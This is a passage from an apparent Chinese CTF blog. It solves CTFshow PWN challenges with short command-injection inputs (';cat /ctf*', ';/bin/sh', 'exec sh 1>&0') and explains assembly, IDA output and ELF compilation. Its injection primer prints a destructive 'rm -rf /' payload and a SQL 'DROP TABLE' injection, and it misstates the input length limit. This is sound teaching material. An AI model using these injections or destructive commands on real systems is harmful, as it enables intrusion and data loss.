class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1.根据执行的结果，将相应的提示信息赋值给变量 v4。</p><p>2.根据执行的结果，输出相应的提示信息。</p><p>可以看到在选项3最后会执行system(“cat /ctfshow_flag”);命令，虽然最终能达到我们想要的效</p><p>果，但是它sleep了很久很久，本地等的话没什么问题，但是远程环境并没有这么久，因此这</p><p>条直接pass，其他1/4/5选项都没有实质性作用，但是2那里会有问题，我们可以进行拼接，限</p><p>制了10字节</p><p>但是我们完全够用，可以构造出 “;cat /ctf*” “;/bin/sh”等</p><p>直接拿取一个shell或者直接读出flag</p><p>在Linux中，通配符 * 表示匹配任意长度（包括零长度）的任意字符序列。</p><p>所以cat /ctf*能够读到flag</p><h2 id="3-；bin-x2F-sh（命令注入漏洞产生原因）"><a href="#3-；bin-x2F-sh（命令注入漏洞产生原因）" class="headerlink" title="3.；bin/sh（命令注入漏洞产生原因）"></a>3.；bin/sh（命令注入漏洞产生原因）</h2><p>在这个程序中，用户的输入被直接用于构造并执行系统命令，这是一个典型的命令注入漏洞。</p><p>具体来说，当用户选择选项2并输入一个目录名时，程序会将用户的输入追加到<code>dest</code>字符串中，然后执行<code>system(dest)</code>。<code>system()</code>函数会执行参数中的字符串作为命令。因为程序没有对用户的输入进行任何过滤或检查，所以用户可以输入一些特殊的字符串，如“;cat /ctf*”或“;/bin/sh”，来执行任意命令。</p><p>这是因为在Linux中，分号（;）用于分隔多个命令，所以用户可以通过输入包含分号的字符串来执行多个命令。此外，用户的输入并没有长度限制，所以用户可以输入任意长度的命令。</p><p>因此，这个程序没有正确地处理用户的输入，允许用户通过输入特殊的字符串来执行任意命令。这是一个典型的命令注入攻击。</p><h2 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">read(0, buf, 0xAuLL); // 读取用户的输入，存储在buf中 strcat(dest, buf); // 将buf中的字符串追加到dest中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是一个在C语言中常见的从用户接收输入并执行命令的模式。下面是每个命令的详细解析：</p><ol><li><p><code>read(0, buf, 0xAuLL);</code></p><p><code>read</code> 是一个系统调用，用于从文件描述符中读取数据。在这里，<code>0</code> 是文件描述符，代表标准输入（stdin），<code>buf</code> 是一个字符数组，用于存储从标准输入读取的数据，<code>0xAuLL</code> 是要读取的字节数，这里是16进制的<code>A</code>，转换为十进制就是10，所以这个命令会从标准输入读取10个字节的数据，存储在<code>buf</code>中。</p></li><li><p><code>strcat(dest, buf);</code></p><p><code>strcat</code> 是一个标准库函数，用于将两个字符串连接起来。在这里，<code>dest</code> 是目标字符串，<code>buf</code> 是源字符串，这个命令会将<code>buf</code>中的字符串追加到<code>dest</code>的末尾。需要注意的是，<code>strcat</code> 不会检查<code>dest</code>是否有足够的空间来存储结果，如果<code>dest</code>的空间不足，就会发生缓冲区溢出，这可能导致程序崩溃或者被攻击者利用。</p></li><li><p><code>system(dest);</code></p><p><code>system</code> 是一个标准库函数，用于执行一个系统命令。在这里，<code>dest</code> 是要执行的命令，这个命令会被传递给系统的命令解释器（通常是<code>/bin/sh</code>或者<code>cmd.exe</code>），命令解释器会执行这个命令，然后返回结果。需要注意的是，<code>system</code> 函数会执行任何传递给它的命令，如果这个命令是由用户提供的，那么用户就可以执行任意的系统命令，这可能导致安全问题。</p></li><li><p>0xAuLL</p><p>在C语言中，<code>0xAuLL</code>是一个无符号长长整型（unsigned long long）常量的表示方法。这里的<code>0xA</code>是一个十六进制的数，等于十进制的10。<code>u</code>和<code>LL</code>是后缀，用来指定这个常量的类型。</p><ul><li><code>u</code>或<code>U</code>后缀表示这是一个无符号（unsigned）整数。无符号整数只能表示非负数。</li><li><code>LL</code>或<code>ll</code>后缀表示这是一个长长整型（long long）整数。在大多数系统中，长长整型整数至少有64位。</li></ul><p>所以，<code>0xAuLL</code>表示的是一个无符号长长整型整数，值为10。</p></li></ol><h2 id="4、命令注入漏洞补充"><a href="#4、命令注入漏洞补充" class="headerlink" title="4、命令注入漏洞补充"></a>4、命令注入漏洞补充</h2><p>命令注入漏洞是一种常见的安全漏洞，它存在于当应用程序将不可信的输入用作命令或参数并执行时。除了上述的例子，还有许多其他的命令注入漏洞的例子，包括：</p><ol><li><p><strong>Shell命令注入</strong>：这是最常见的命令注入漏洞类型。如果应用程序使用用户提供的输入构建并执行shell命令，那么攻击者可以通过提供包含额外命令的输入来执行任意命令。例如，如果应用程序使用<code>system("ping " + user_input)</code>来执行ping命令，那么攻击者可以提供<code>"127.0.0.1; rm -rf /"</code>作为输入，这将导致应用程序执行<code>rm -rf /</code>命令，删除所有文件。</p></li><li><p><strong>SQL命令注入</strong>：这是另一种常见的命令注入漏洞类型。如果应用程序使用用户提供的输入构建并执行SQL命令，那么攻击者可以通过提供包含额外命令的输入来执行任意SQL命令。例如，如果应用程序使用<code>"SELECT * FROM users WHERE name = '" + user_input + "'"</code>来查询用户，那么攻击者可以提供<code>"'; DROP TABLE users; --"</code>作为输入，这将导致应用程序执行<code>DROP TABLE users</code>命令，删除users表。</p></li><li><p><strong>LDAP命令注入</strong>：如果应用程序使用用户提供的输入构建并执行LDAP（轻量级目录访问协议）查询，那么攻击者可以通过提供包含额外命令的输入来执行任意LDAP查询。</p></li><li><p><strong>OS命令注入</strong>：这是一种更广泛的命令注入漏洞类型，包括shell命令注入。如果应用程序使用用户提供的输入构建并执行操作系统命令，那么攻击者可以通过提供包含额外命令的输入来执行任意操作系统命令。</p></li></ol><p>防止命令注入的最佳实践是永远不要使用用户提供的输入构建并执行命令。如果必须这样做，那么应该使用参数化的接口，并对用户的输入进行严格的验证和过滤。</p><h1 id="六、pwn018"><a href="#六、pwn018" class="headerlink" title="六、pwn018"></a>六、pwn018</h1><h2 id="echo-‘flag-is-here’-gt-gt-x2F-ctfshow-flag中-gt-gt-和-gt-的区别"><a href="#echo-‘flag-is-here’-gt-gt-x2F-ctfshow-flag中-gt-gt-和-gt-的区别" class="headerlink" title="echo ‘flag is here’ >> /ctfshow_flag中>>和>的区别"></a>echo ‘flag is here’ &gt;&gt; /ctfshow_flag中&gt;&gt;和&gt;的区别</h2><ol><li><code>echo 'flag is here' &gt;&gt; /ctfshow_flag</code>：这个命令会将字符串 <code>'flag is here'</code> 追加到文件 <code>/ctfshow_flag</code> 的末尾。如果文件 <code>/ctfshow_flag</code> 不存在，那么这个命令会创建这个文件。如果文件已经存在，那么这个命令不会覆盖文件的原有内容，而是在原有内容后面添加新的内容。</li><li><code>echo 'flag is here' &gt; /ctfshow_flag</code>：这个命令会将字符串 <code>'flag is here'</code> 写入文件 <code>/ctfshow_flag</code>。如果文件 <code>/ctfshow_flag</code> 不存在，那么这个命令会创建这个文件。如果文件已经存在，那么这个命令会覆盖文件的原有内容，只保留新的内容。</li></ol><p>所以，这两个命令的主要区别在于 <code>&gt;&gt;</code> 是追加内容，而 <code>&gt;</code> 是覆盖内容。</p><h1 id="七、pwn019"><a href="#七、pwn019" class="headerlink" title="七、pwn019"></a>七、pwn019</h1><p>\1. if (fork()) : 这里使用 fork() 函数创建一个子进程。父进程中， fork() 返回子进程的进</p><p>程ID，所以进入 if 语句块；子进程中， fork() 返回0，所以进入 else 语句块。</p><p>在父进程中： 2. wait(0LL) : 父进程通过 wait() 函数等待子进程的结束，以确保子进程执行完</p><p>毕。</p><p>\1. sleep(3u) : 父进程睡眠3秒钟。</p><p>\2. printf(“flag is not here!”) : 输出提示信息，表明flag不在此处。</p><p>在子进程中： 2. puts(“give you a shell! now you need to get flag!”) : 输出提示信息，</p><p>表示给予用户一个shell，让其获取flag。</p><p>\1. fclose() : 关闭文件输出流。</p><p>\2. read(0, &amp;buf, 0x20uLL) : 从标准输入中读取用户输入的命令，并存储在 buf 中。</p><p>\3. system(&amp;buf) : 执行用户输入的命令。</p><p>我们可以使用了 exec 函数来执行 sh 命令，并使用 1&gt;&amp;0 来进行输出重定向。这个命令将标准输出</p><p>重定向到标准输入，实际上就是将命令的输出发送到后续命令的输入。</p><p>具体来说， 1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入。通过将标准输出重定向到标准输入，可</p><p>以实现将命令的输出作为后续命令的输入。这样可以在执行 sh 命令后，进入一个交互式的Shell环境，</p><p>可以在该环境中执行命令并与用户进行交互。</p><p>这里限制了20个字节，反弹shell</p><p>也可以直接exec cat /ctf* 1&gt;&amp;0 将 cat /ctf* 命令的输出发送到标准输入，实际上就是将命令的输</p><p>出再次输出到屏幕上。</p><p>的话理论上也可行，感兴趣的可以自行去尝试。</p>]]></content>
      
      
      <categories>
          
          <category> PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN入门刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn005</title>
      <link href="/du-yu/pwn-begain-exerciser-02.html"/>
      <url>/du-yu/pwn-begain-exerciser-02.html</url>
      
        <content type="html"><![CDATA[<h1 id="PWN005"><a href="#PWN005" class="headerlink" title="PWN005"></a>PWN005</h1><h2 id="一、asm文件"><a href="#一、asm文件" class="headerlink" title="一、asm文件"></a>一、asm文件</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">section .data             ; 这一行定义了一个名为 .data 的数据段，这个段通常用于存储程序的全局变量和静态变量。    msg db "Welcome_to_CTFshow_PWN", 0  ; 这一行在 .data 段中定义了一个名为 msg 的变量，db 表示 "define byte"，也就是定义一个字节。"Welcome_to_CTFshow_PWN" 是一个字符串，每个字符占一个字节，字符串后面的 0 表示字符串的结束符。section .text             ; 这一行定义了一个名为 .text 的文本段，这个段通常用于存储程序的代码。    global _start         ; 这一行声明了一个全局符号 _start。在 Unix-like 系统中，_start 通常是程序的入口点。_start:                   ; 这一行定义了一个标签 _start，这是程序的入口点。在这里，程序的执行将从这个位置开始。; 立即寻址方式    mov eax, 11         ; 将11赋值给eax    add eax, 114504     ; eax加上114504    sub eax, 1          ; eax减去1; 寄存器寻址方式    mov ebx, 0x36d      ; 将0x36d赋值给ebx    mov edx, ebx        ; 将ebx的值赋值给edx; 直接寻址方式    mov ecx, msg      ; 将msg的地址赋值给ecx; 寄存器间接寻址方式    mov esi, msg        ; 将msg的地址赋值给esi    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax; 寄存器相对寻址方式    mov ecx, msg        ; 将msg的地址赋值给ecx    add ecx, 4          ; 将ecx加上4    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax; 基址变址寻址方式    mov ecx, msg        ; 将msg的地址赋值给ecx    mov edx, 2          ; 将2赋值给edx    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax; 相对基址变址寻址方式    mov ecx, msg        ; 将msg的地址赋值给ecx    mov edx, 1          ; 将1赋值给edx    add ecx, 8          ; 将ecx加上8    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax; 输出字符串    mov eax, 4          ; 系统调用号4代表输出字符串    mov ebx, 1          ; 文件描述符1代表标准输出    mov ecx, msg        ; 要输出的字符串的地址    mov edx, 22         ; 要输出的字符串的长度    int 0x80            ; 调用系统调用; 退出程序    mov eax, 1          ; 系统调用号1代表退出程序    xor ebx, ebx        ; 返回值为0    int 0x80            ; 调用系统调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、获取字符串"><a href="#二、获取字符串" class="headerlink" title="二、获取字符串"></a>二、获取字符串</h2><p>1、nasm -f elf pwn005welcome_to_CTFshow.sam   （用NASM编译器将汇编文件编译为elf二进制文件）</p><p>2、ld -m elf_i386 -s -o 110pwn pwn005welcome_to_CTFshow.o  （链接成一个 32 位的、去除了符号信息的 ELF 格式的可执行文件）</p><p><code>-s</code>：这是一个选项，表示我们要去除（strip）生成的可执行文件中的所有符号信息。这可以使得生成的文件更小，但也使得调试变得更困难</p><p>3、运行文件得到字符串</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713164705629.png" alt="image-20230713164705629"></p><h2 id="三、IDA思考解析"><a href="#三、IDA思考解析" class="headerlink" title="三、IDA思考解析"></a>三、IDA思考解析</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230714182900681.png" alt="image-20230714182900681"></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">LOAD:08048000                               ; Segment type: Pure codeLOAD:08048000                               ; Segment permissions: Read/ExecuteLOAD:08048000                               LOAD segment mempage public 'CODE' use32 ; 定义一个名为 LOAD 的代码段，这个段是公开的，可以被其他模块访问，使用32位地址LOAD:08048000                               assume cs:LOAD                          ; 假设代码段寄存器 cs 指向 LOAD 段LOAD:08048000                               ;org 8048000h                            ; 设置程序的起始地址为 0x8048000LOAD:08048000                               assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing ; 假设其他段寄存器没有指向任何段，数据段寄存器 ds 指向 _data 段LOAD:08048000 7F 45 4C 46                   dword_8048000 dd 464C457Fh              ; 定义一个名为 dword_8048000 的变量，值为 0x464C457F，这是 ELF 文件的魔数LOAD:08048004 01                            db 1                                    ; 文件类别：32位LOAD:08048005 01                            db 1                                    ; 数据编码：小端LOAD:08048006 01                            db 1                                    ; 文件版本LOAD:08048007 00                            db 0                                    ; 操作系统/ABI：UNIX System V ABILOAD:08048008 00                            db 0                                    ; ABI 版本LOAD:08048009 00 00 00 00 00 00 00          db 7 dup(0)                             ; 填充字节，没有实际意义LOAD:08048010 02 00                         dw 2                                    ; 文件类型：可执行文件LOAD:08048012 03 00                         dw 3                                    ; 机器类型：Intel 386LOAD:08048014 01 00 00 00                   dd 1                                    ; 文件版本LOAD:08048018 80 80 04 08                   dd offset start                         ; 程序入口点的地址LOAD:0804801C 34 00 00 00                   dd 34h                                  ; 程序头表（Program Header Table，PHT）在文件中的偏移LOAD:08048020 18 01 00 00                   dd 118h                                 ; 节头表（Section Header Table，SHT）在文件中的偏移LOAD:08048024 00 00 00 00                   dd 0                                    ; 处理器特定的标志，对于 Intel 386，这个字段没有用LOAD:08048028 34 00                         dw 34h                                  ; ELF 头的大小LOAD:0804802A 20 00                         dw 20h                                  ; 程序头表条目的大小LOAD:0804802C 02 00                         dw 2                                    ; 程序头表的条目数LOAD:0804802E 28 00                         dw 28h                                  ; 节头表条目的大小LOAD:08048030 04 00                         dw 4                                    ; 节头表的条目数LOAD:08048032 03 00                         dw 3                                    ; 字符串表的节头表条目索引LOAD:08048034                               ; ELF32 Program HeaderLOAD:08048034                               ; PHT Entry 0LOAD:08048034 01 00 00 00                   dd 1                                    ; 类型：LOADLOAD:08048038 00 00 00 00                   dd 0                                    ; 在文件中的偏移LOAD:0804803C 00 80 04 08                   dd offset dword_8048000                 ; 虚拟地址LOAD:08048040 00 80 04 08                   dd 8048000h                             ; 物理地址LOAD:08048044 E8 00 00 00                   dd 0E8h                                 ; 在文件映像中的大小LOAD:08048048 E8 00 00 00                   dd 0E8h                                 ; 在内存映像中的大小LOAD:0804804C 05 00 00 00                   dd 5                                    ; 标志LOAD:08048050 00 10 00 00                   dd 1000h                                ; 对齐LOAD:08048054                               ; PHT Entry 1LOAD:08048054 01 00 00 00                   dd 1                                    ; 类型：LOADLOAD:08048058 E8 00 00 00                   dd 0E8h                                 ; 在文件中的偏移LOAD:0804805C E8 90 04 08                   dd offset dword_80490E8                 ; 虚拟地址LOAD:08048060 E8 90 04 08                   dd 80490E8h                             ; 物理地址LOAD:08048064 17 00 00 00                   dd 17h                                  ; 在文件映像中的大小LOAD:08048068 17 00 00 00                   dd 17h                                  ; 在内存映像中的大小LOAD:0804806C 06 00 00 00                   dd 6                                    ; 标志LOAD:08048070 00 10 00 00                   dd 1000h                                ; 对齐LOAD:08048074 00 00 00 00 00 00 00 00 00 00+align 10hLOAD:08048074 00 00                         LOAD ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230714184240261.png" alt="image-20230714184240261"></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">以下是这段代码的行注释：.data:080490E8                               ; Segment type: Pure data; 段类型：纯数据.data:080490E8                               ; Segment permissions: Read/Write; 段权限：读/写.data:080490E8                               _data segment dword public 'DATA' use32; 定义数据段，使用32位双字，公共标识为'DATA'.data:080490E8                               assume cs:_data; 假设代码段指向_data.data:080490E8                               ;org 80490E8h; 设置段的初始地址为80490E8h.data:080490E8 57 65 6C 63                   dword_80490E8 dd 636C6557h              ; DATA XREF: LOAD:0804805C↑o; 在地址80490E8上定义一个双字数据636C6557h，并标记其数据交叉引用.data:080490E8                                                                       ; start+14↑r; 数据交叉引用的偏移地址：从start开始向上偏移14.data:080490E8                                                                       ; start+1A↑o; 数据交叉引用的偏移地址：从start开始向上偏移1A.data:080490E8                                                                       ; start+21↑o; 数据交叉引用的偏移地址：从start开始向上偏移21.data:080490E8                                                                       ; start+2B↑o; 数据交叉引用的偏移地址：从start开始向上偏移2B.data:080490E8                                                                       ; start+38↑o; 数据交叉引用的偏移地址：从start开始向上偏移38.data:080490E8                                                                       ; start+53↑o; 数据交叉引用的偏移地址：从start开始向上偏移53.data:080490EC 6F 6D 65 5F 74 6F 5F 43 54 46+aOmeToCtfshowPw db 'ome_to_CTFshow_PWN',0; 在地址080490EC上定义一个字节数据，字符串为'ome_to_CTFshow_PWN'，以0结尾.data:080490EC 73 68 6F 77 5F 50 57 4E 00    _data ends; 数据段结束.data:080490EC; 一个空行，没有指令或数据.data:080490EC; 另一个空行，没有指令或数据.data:080490EC                               end start; 程序结束，start是程序的开始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1、这部分代码是-IDA-反汇编结果中的数据段（-data）部分，主要包含了你在原始汇编代码中定义的全局变量-msg。下面是每一行的解释："><a href="#1、这部分代码是-IDA-反汇编结果中的数据段（-data）部分，主要包含了你在原始汇编代码中定义的全局变量-msg。下面是每一行的解释：" class="headerlink" title="1、这部分代码是 IDA 反汇编结果中的数据段（.data）部分，主要包含了你在原始汇编代码中定义的全局变量 msg。下面是每一行的解释："></a>1、这部分代码是 IDA 反汇编结果中的数据段（<code>.data</code>）部分，主要包含了你在原始汇编代码中定义的全局变量 <code>msg</code>。下面是每一行的解释：</h3><ul><li><p><code>.data:080490E8 57 65 6C 63 dword_80490E8 dd 636C6557h</code>：这一行定义了一个名为 <code>dword_80490E8</code> 的四字节（double word）变量，它的值是 <code>636C6557h</code>，这是一个十六进制数。这个十六进制数对应的 ASCII 字符串是 “Welc”，这是 “Welcome_to_CTFshow_PWN” 的前四个字符。<code>57 65 6C 63</code> 是 “Welc” 的十六进制 ASCII 码，它们是以小端字节序排列的，所以在这里看起来顺序是反的。</p></li><li><p>接下来的几行（<code>.data:080490E8</code>）是空行，它们没有包含任何代码。但是，这些行后面的注释（如 <code>; start+14↑r</code>）表示 <code>dword_80490E8</code> 在 <code>.text</code> 段中的引用位置。</p></li><li><p><code>.data:080490EC 6F 6D 65 5F 74 6F 5F 43 54 46+aOmeToCtfshowPw db 'ome_to_CTFshow_PWN',0</code>：这一行定义了一个字符串，它的内容是 “ome_to_CTFshow_PWN”，这是 “Welcome_to_CTFshow_PWN” 的剩余部分。<code>6F 6D 65 5F 74 6F 5F 43 54 46...</code> 是这个字符串的十六进制 ASCII 码。</p></li><li><p><code>.data:080490EC 73 68 6F 77 5F 50 57 4E 00 _data ends</code>：这一行表示数据段（<code>.data</code>）的结束。<code>73 68 6F 77 5F 50 57 4E 00</code> 是 “show_PWN” 和字符串结束符的十六进制 ASCII 码，这是 “Welcome_to_CTFshow_PWN” 的最后一部分。</p></li><li><p>最后的几行（<code>.data:080490EC end start</code>）表示程序的结束，<code>end start</code> 指定了程序的入口点是 <code>start</code>。</p></li></ul><p>总的来说，这部分代码就是 “Welcome_to_CTFshow_PWN” 这个字符串在内存中的表示形式。由于 x86 架构的 CPU 使用的是小端字节序，所以这个字符串的每四个字符被反序存储。</p><h3 id="2、DATA-XREF-LOAD-0804805C↑o和start-53↑o表示什么"><a href="#2、DATA-XREF-LOAD-0804805C↑o和start-53↑o表示什么" class="headerlink" title="2、DATA XREF: LOAD:0804805C↑o和start+53↑o表示什么"></a>2、DATA XREF: LOAD:0804805C↑o和start+53↑o表示什么</h3><p>在 IDA 的反汇编结果中，<code>DATA XREF: LOAD:0804805C↑o</code> 和 <code>start+53↑o</code> 这样的注释表示数据的交叉引用（cross-reference）。</p><ul><li><code>DATA XREF: LOAD:0804805C↑o</code>：这表示当前的数据（也就是 <code>dword_80490E8</code>）在地址 <code>0804805C</code> 的代码中被引用了。<code>XREF</code> 是 “cross-reference” 的缩写，<code>LOAD:0804805C</code> 是引用的位置，<code>↑o</code> 表示这是一个向上的引用（也就是说，引用的位置在当前位置的上方）。</li><li><code>start+53↑o</code>：这表示当前的数据在 <code>start</code> 标签后的第 53 个字节的代码中被引用了。<code>start+53</code> 是引用的位置，<code>↑o</code> 表示这是一个向上的引用。</li></ul><p>这些交叉引用信息可以帮助你理解数据在程序中的使用情况。例如，你可以通过查看 <code>dword_80490E8</code> 的交叉引用，来找出所有使用这个数据的代码。</p><h3 id="3、aOmeToCtfshowPw-："><a href="#3、aOmeToCtfshowPw-：" class="headerlink" title="3、aOmeToCtfshowPw ："></a>3、<strong>aOmeToCtfshowPw</strong> ：</h3><p>并不是一个命令，而是 IDA 在反汇编过程中，为了方便阅读，自动生成的一个<strong>标签</strong>。这个标签的名字可能会因 IDA 的版本和设置的不同而有所不同。</p><h3 id="4、dd命令和dd命令的区别："><a href="#4、dd命令和dd命令的区别：" class="headerlink" title="4、dd命令和dd命令的区别："></a>4、dd命令和dd命令的区别：</h3><p><code>db</code> 和 <code>dd</code> 是汇编语言中的伪指令，用于在数据段中定义数据。它们的含义分别是 “define byte” 和 “define doubleword”。</p><ul><li><code>db</code>：定义一个字节的数据。例如，<code>msg db 'a'</code> 将定义一个名为 <code>msg</code> 的变量，它的值是字符 ‘a’ 的 ASCII 码。</li><li><code>dd</code>：定义一个四字节（doubleword）的数据。例如，<code>num dd 1234</code> 将定义一个名为 <code>num</code> 的变量，它的值是 1234。</li></ul><p>这两个伪指令都可以用来定义字符串。例如，<code>msg db 'Hello, world!'</code> 将定义一个包含 “Hello, world!” 这个字符串的变量。然而，由于 <code>db</code> 定义的是单字节的数据，所以这个字符串中的每个字符都将占用一个字节的空间。</p><p>另一方面，<code>dd</code> 定义的是四字节的数据，所以它可以用来定义一个包含四个字符的字符串。例如，<code>msg dd 'abcd'</code> 将定义一个包含 “abcd” 这个字符串的变量。这个字符串中的每个字符都将占用一个字节的空间，但是由于 <code>dd</code> 定义的是四字节的数据，所以这四个字符将被存储在一个四字节的空间中。</p><p>总的来说，<code>db</code> 和 <code>dd</code> 的主要区别在于它们定义的数据的大小：<code>db</code> 定义的是单字节的数据，而 <code>dd</code> 定义的是四字节的数据。</p><h2 id="四、ubuntun解析"><a href="#四、ubuntun解析" class="headerlink" title="四、ubuntun解析"></a>四、ubuntun解析</h2>]]></content>
      
      
      <categories>
          
          <category> PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN入门刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译与目标文件结构</title>
      <link href="/du-yu/pwn-begain-study02.html"/>
      <url>/du-yu/pwn-begain-study02.html</url>
      
        <content type="html"><![CDATA[<h1 id="编译和目标文件结构"><a href="#编译和目标文件结构" class="headerlink" title="编译和目标文件结构"></a><strong>编译和目标文件结构</strong></h1><h2 id="一、编译"><a href="#一、编译" class="headerlink" title="一、编译"></a>一、编译</h2><p>（GCC）编译环境</p><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-hello-c"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-hello-c" class="headerlink" title="1、root@ubuntu ~/3/pwn# gcc hello.c"></a>1、root@ubuntu ~/3/pwn# gcc hello.c</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-12.jpg" alt="001-12"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-6.jpg" alt="001-6"></p><h2 id="1、预编译"><a href="#1、预编译" class="headerlink" title="1、预编译"></a>1、预编译</h2><p>、</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-7.jpg" alt="001-7"></p><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-E-ctf-c-o-ctf-i"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-E-ctf-c-o-ctf-i" class="headerlink" title="1、root@ubuntu~/3/pwn# gcc-E ctf.c-o ctf.i"></a>1、root@ubuntu~/3/pwn# gcc-E ctf.c-o ctf.i</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-9.jpg" alt="001-9"></p><h2 id="2、编译"><a href="#2、编译" class="headerlink" title="2、编译"></a>2、编译</h2><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-S-ctf-c-o-ctf-s"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-S-ctf-c-o-ctf-s" class="headerlink" title="1、root@ubuntu~/3/pwn# gcc -S ctf.c -o ctf.s"></a>1、root@ubuntu~/3/pwn# gcc -S ctf.c -o ctf.s</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-8.jpg" alt="001-8"></p><h3 id="2、编译器原理"><a href="#2、编译器原理" class="headerlink" title="2、编译器原理"></a>2、编译器原理</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-10.jpg" alt="001-10"></p><h3 id="3、汇编器"><a href="#3、汇编器" class="headerlink" title="3、汇编器"></a>3、汇编器</h3><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-c-hello-s-m32-o-ctf-o"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-c-hello-s-m32-o-ctf-o" class="headerlink" title="1、root@ubuntu~/3/pwn# gcc -c hello.s -m32 -o ctf.o"></a>1、root@ubuntu~/3/pwn# gcc -c hello.s -m32 -o ctf.o</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-11.jpg" alt="001-11"></p><h2 id="二、目标文件格式"><a href="#二、目标文件格式" class="headerlink" title="二、目标文件格式"></a>二、目标文件格式</h2><h3 id="objdump-常用工具"><a href="#objdump-常用工具" class="headerlink" title="objdump(常用工具)"></a>objdump(常用工具)</h3><p><strong><code>objdump</code>查看内存或文件中的数据时，这些工具通常会以十六进制的形式显示数据，因为十六进制比二进制更紧凑，而且比八进制和十进制更容易转换为二进制。</strong></p><p><strong><code>objdump -h</code>命令用于显示二进制文件的节头信息</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709172305384.png" alt="image-20230709172305384"></p><ol><li><p>.text段 ：保存编译后的机器指令</p></li><li><p>.data段：保存全局变量和局部静态变量的数据  </p></li><li><p>.bss段：保存未初始化的全局变量和未初始化的局部静态变量</p></li><li><p>.comment：注释段                                                                                                                                                                      <strong>注：</strong><code>.comment</code>段是ELF文件中的一个可选段，通常包含了一些元数据，如编译器版本信息、操作系统版本信息、链接器版本信息等。这些信息对于程序的执行没有影响，但可能对调试、分析或理解二进制文件的来源和构建过程有帮助。</p></li><li><p>.note.GNU-stack:堆栈提示段    </p></li><li><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709172053432.png" alt="image-20230709172053432"></p></li><li><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709172825881.png"></p></li><li><p>root@ubuntu~/3/pwn# gcc -c SimpleSection.c -m32  #生成一个32位的文件</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt; // 引入标准输入输出库，这样我们就可以使用printf函数了int global_init_var = 84; // 定义并初始化一个全局变量global_init_var，初始值为84int global_uninit_var; // 定义一个全局变量global_uninit_var，未指定初始值，它会被自动初始化为0// 